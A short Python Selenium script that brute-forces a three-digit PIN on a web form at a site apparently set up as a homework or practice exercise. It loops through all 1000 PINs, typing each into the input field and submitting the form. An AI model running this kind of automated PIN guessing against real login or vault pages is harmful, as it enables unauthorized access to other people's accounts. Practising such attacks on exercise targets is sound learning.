from selenium import webdriver

browser = webdriver.Firefox()
browser.get("https://vault.homework.quest")

elem = browser.find_element('tag name', 'a')
elem.click()

for i in range(1000):
    elem = browser.find_element('tag name', 'input')
    elem.send_keys("%.03d" % (i))
    btn = browser.find_element('id', 'pin-form-submit')
    btn.click()


